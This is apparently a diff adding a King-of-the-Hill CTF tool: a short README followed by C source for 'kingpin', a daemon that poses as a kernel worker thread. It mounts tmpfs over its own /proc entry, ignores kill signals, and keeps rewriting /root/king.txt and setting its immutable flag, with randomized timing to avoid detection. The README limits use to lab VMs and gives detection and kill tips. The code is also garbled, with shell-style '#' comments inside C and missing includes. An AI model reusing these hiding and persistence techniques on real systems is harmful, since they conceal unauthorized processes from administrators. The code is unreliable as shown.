@@ -1,0 +1,295 @@
+Only run this code inside an authorized KoTH or CTF lab VM that you control. 
+Do not run on other people’s machines or any production systems.
+
+I usually run and test this in food-koth room, so if you want some few tweak I recommend 
+you running this in koth rooms like hacker-koth/food-koth.
+and for the reference of this kit:
+
+"https://github.com/djkimik/Aquinas-ctf-writeups/blob/master/tryhackme-koth/tools/kingmaker.c"
+
+ compile before the delivery:
+ gcc -static -o kingpin kingpin.c
+  
+ USAGE:
+ ./kingpin
+ 
+ HOW IT WORKS:
+ 1. The process daemonizes itself using double-fork technique
+ 2. It disguises itself as a kernel worker thread [kworker/0:1H]
+ 3. It continuously overwrites /root/king.txt with "your username"
+ 4. It sets the immutable flag to prevent easy modification
+ 5. It uses variable timing to avoid detection patterns
+ 6. It ignores most termination signals
+ 
+ Features:
+ Appears as legitimate kernel thread in process lists
+ Attempts to hide /proc filesystem entries
+ Uses randomized timing patterns
+ Ignores common kill signals
+ File protection using immutable flags
+ 
+ Its sus if you check the:
+ Real kernel threads have no executable path (/proc/PID/exe)
+ Real kernel threads are children of kthreadd (PID 2)
+ Monitor file access patterns with lsof
+ Look for tmpfs mounts over /proc directories
+ 
+ How to kill it?:
+ Use SIGKILL (kill -9) which cannot be ignored
+ Find fake process: ls -la /proc/*/exe | grep kworker
+ Remove immutable flag: chattr -i /root/king.txt
+ Kill all non-bracketed kworker processes
+ 
+ ```
+----------------------------------------------------------------------------------------|
+ #Configuration constants
+#define KING_FILE_PATH "/root/king.txt"
+#define KING_USERNAME "your username"
+
+##Fake process names to blend in with legitimate system processes
+static char fake_systemd_name[] = "/lib/systemd/systemd-resolved";
+static char fake_kernel_thread[] = "[kworker/0:1H]";
+
+ 
+ # ADVANCED HIDING TECHNIQUES
+ ## This function implements several methods to hide the process from detection
+  
+static void apply_advanced_hiding() {
+    char proc_directory_path[64];
+    char cmdline_file_path[80];
+    
+    ## Get our current process ID
+    pid_t current_pid = getpid();
+    
+    ## Build path to our /proc/PID directory
+    snprintf(proc_directory_path, sizeof(proc_directory_path), "/proc/%d", current_pid);
+    
+    ## TECHNIQUE 1: Mount tmpfs over our /proc/PID directory
+    ## This attempts to hide our process information from /proc filesystem
+    ## When someone tries to read /proc/[our_pid]/, they get an empty tmpfs instead
+    ## NOTE: This requires root privileges and may fail on some systems
+    if (mount("tmpfs", proc_directory_path, "tmpfs", MS_NOEXEC | MS_NOSUID, "size=1k") == 0) {
+       ## Mount successful - our /proc entry is now hidden behind tmpfs
+    }
+    
+    ## TECHNIQUE 2: Try to make our cmdline file unreadable
+    ## Build path to our command line file
+    snprintf(cmdline_file_path, sizeof(cmdline_file_path), "/proc/%d/cmdline", current_pid);
+    ## Remove all permissions (this usually fails but worth trying)
+    chmod(cmdline_file_path, 0000);
+    
+    ## TECHNIQUE 3: Set process name to empty/null
+    ## This makes the process appear inactive or sleeping in some process viewers
+    prctl(PR_SET_NAME, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0, 0, 0);
+}
+
+ 
+ #PROCESS CAMOUFLAGE TECHNIQUES
+ ##This function makes our process blend in with legitimate system processes
+  
+static void apply_process_camouflage() {
+    FILE *process_list_pipe;
+    char line_buffer[256];
+    
+    ## TECHNIQUE 1: Dynamic process name selection
+    ## Look for existing system processes to mimic
+    process_list_pipe = popen("ps -eo pid,comm | grep -E '(systemd|init|kthread)' | head -1", "r");
+    if (process_list_pipe) {
+        if (fgets(line_buffer, sizeof(line_buffer), process_list_pipe)) {
+            int target_process_pid = atoi(line_buffer);
+            if (target_process_pid > 1) {
+                ## Create a process name that looks related to the system process
+                char new_process_name[32];
+                snprintf(new_process_name, sizeof(new_process_name), "systemd-%d", target_process_pid % 1000);
+                prctl(PR_SET_NAME, new_process_name, 0, 0, 0);
+            }
+        }
+        pclose(process_list_pipe);
+    }
+}
+
+ 
+ # STEALTH INITIALIZATION
+ # This function performs complete process hiding and daemonization
+  
+static void initialize_stealth_mode(int argument_count, char **argument_vector) {
+    size_t total_argument_length;
+    int file_descriptor;
+    int i;
+    
+    # Apply advanced hiding techniques first
+    apply_advanced_hiding();
+    apply_process_camouflage();
+    
+    # DAEMONIZATION PROCESS
+    ## Step 1: First fork - detach from parent process
+    if (fork() != 0) {
+        exit(0);  ##S Parent process exits, child continues
+    }
+    
+    ## Step 2: Create new session - detach from controlling terminal
+    setsid();
+    
+    ## Step 3: Second fork - prevent acquiring a controlling terminal
+    ## This is the "double fork" technique for complete daemonization
+    if (fork() != 0) {
+        exit(0);  ## First child exits, grandchild continues
+    }
+    
+    ## Step 4: Change working directory to root
+    ## Prevents keeping any directory in use
+    chdir("/");
+    
+    ## Step 5: Close all file descriptors
+    ## This prevents inheriting any open files from the parent
+    for (file_descriptor = 0; file_descriptor < 256; file_descriptor++) {
+        close(file_descriptor);
+    }
+    
+    ## Step 6: Redirect standard streams to /dev/null
+    ## This prevents any output from appearing anywhere
+    open("/dev/null", O_RDWR);  ## stdin (fd 0)
+    dup2(0, 1);                 ## stdout (fd 1) -> /dev/null
+    dup2(0, 2);                 ## stderr (fd 2) -> /dev/null
+    
+    # PROCESS NAME SPOOFING
+    ## Step 7: Set kernel-visible process name
+    prctl(PR_SET_NAME, fake_kernel_thread, 0, 0, 0);
+    
+    ## Step 8: Modify command line arguments visible in ps
+    if (argument_count > 0) {
+        ## Calculate total space available in argv
+        total_argument_length = 0;
+        for (i = 0; i < argument_count; i++) {
+            total_argument_length += strlen(argument_vector[i]) + 1;
+        }
+        
+        ## Clear the original arguments
+        memset(argument_vector[0], 0, total_argument_length);
+        
+        ## Replace with fake kernel thread name
+        strncpy(argument_vector[0], fake_kernel_thread, total_argument_length - 1);
+    }
+    
+    #SIGNAL HANDLING
+    ##Ignore common signals to prevent easy termination
+    signal(SIGHUP, SIG_IGN);   ##Ignore hangup signal
+    signal(SIGINT, SIG_IGN);   ##Ignore interrupt (Ctrl+C)
+    signal(SIGQUIT, SIG_IGN);  ##Ignore quit (Ctrl+\)
+    signal(SIGPIPE, SIG_IGN);  ##Ignore broken pipe
+    signal(SIGTERM, SIG_IGN);  ##Ignore termination request
+    signal(SIGTSTP, SIG_IGN);  ##Ignore terminal stop (Ctrl+Z)
+    signal(SIGTTIN, SIG_IGN);  ##Ignore background read attempt
+    signal(SIGTTOU, SIG_IGN);  ##Ignore background write attempt
+    signal(SIGUSR1, SIG_IGN);  ##Ignore user signal 1
+    signal(SIGUSR2, SIG_IGN);  ##Ignore user signal 2
+    
+    # NOTE: SIGKILL (signal 9) cannot be ignored and will still kill the process
+}
+
+ 
+ #KING FILE MANIPULATION
+ ##This function writes to the king file and sets protection attributes
+  
+static void write_to_king_file() {
+    FILE *file_pointer;
+    int retry_attempts = 0;
+    int file_flags;
+    
+    ## STEP 1: Remove existing file protection
+    ## Try multiple times in case the file is busy
+    while (retry_attempts < 3) {
+        file_pointer = fopen(KING_FILE_PATH, "r");
+        if (file_pointer) {
+            ## Remove immutable flag using ioctl
+            file_flags = 0;  // No flags = remove all special attributes
+            ioctl(fileno(file_pointer), FS_IOC_SETFLAGS, &file_flags);
+            fclose(file_pointer);
+            break;
+        }
+        retry_attempts++;
+        usleep(100000); // Wait 100ms before retrying
+    }
+    
+    ## STEP 2: Make file writable
+    chmod(KING_FILE_PATH, S_IWUSR | S_IRUSR);  // Read/write for owner only
+    
+    ## STEP 3: Write our username to the file
+    file_pointer = fopen(KING_FILE_PATH, "w");
+    if (file_pointer) {
+        fputs(KING_USERNAME, file_pointer);
+        fclose(file_pointer);
+    }
+    
+    ## STEP 4: Protect the file from modification
+    file_pointer = fopen(KING_FILE_PATH, "r");
+    if (file_pointer) {
+        ## Set file permissions to read-only
+        chmod(KING_FILE_PATH, S_IRUSR | S_IRGRP | S_IROTH);
+        
+        ## Set immutable flag - prevents deletion, modification, or permission changes
+        file_flags = FS_IMMUTABLE_FL;
+        ioctl(fileno(file_pointer), FS_IOC_SETFLAGS, &file_flags);
+        fclose(file_pointer);
+    }
+}
+
+ 
+ # ANTI-DETECTION TIMING
+ ## This function implements variable timing to avoid detection patterns
+ 
+static void random_delay_anti_detection() {
+    int base_delay_microseconds;
+    
+    ## Generate random delay between 0.8 and 1.2 seconds
+    ## This prevents detection based on regular timing patterns
+    base_delay_microseconds = 800000 + (rand() % 400000);
+    
+    ## Sleep for the calculated time
+    usleep(base_delay_microseconds);
+}
+
+ 
+  # MAIN FUNCTION
+ ## Program entry point and main execution loop
+  
+int main(int argument_count, char *argument_vector[]) {
+     ## Initialize random number generator
+     ## Using PID and current time for better randomness
+    srand(getpid() ^ time(NULL));
+    
+    ## Perform complete stealth initialization
+    ## After this point, the process is fully daemonized and hidden
+    initialize_stealth_mode(argument_count, argument_vector);
+    
+    #  MAIN PERSISTENCE LOOP
+    ## This loop runs indefinitely, constantly claiming the king file
+    while (1) {
+        ## Write our username to the king file
+        write_to_king_file();
+        
+        ## Wait with random timing to avoid detection
+        random_delay_anti_detection();
+        
+        #ANTI-DETECTION CHECK
+        ## Occasionally verify our target file still exists
+        ##If it's been deleted, we may have been discovered
+        if (rand() % 1000 == 0) {  ## 0.1% chance each iteration
+            if (access(KING_FILE_PATH, F_OK) != 0) {
+                ## King file doesn't exist - possible detection
+                ## Wait longer before retrying to avoid immediate re-detection
+                usleep(5000000); ## Wait 5 seconds
+            }
+        }
+    }
+    
+    ## This return statement is never reached due to infinite loop
+    return 0;
+}
+--------------------------------------------------------------------------------------|
+  ```
+
+ 
+ 
+ 
+ 
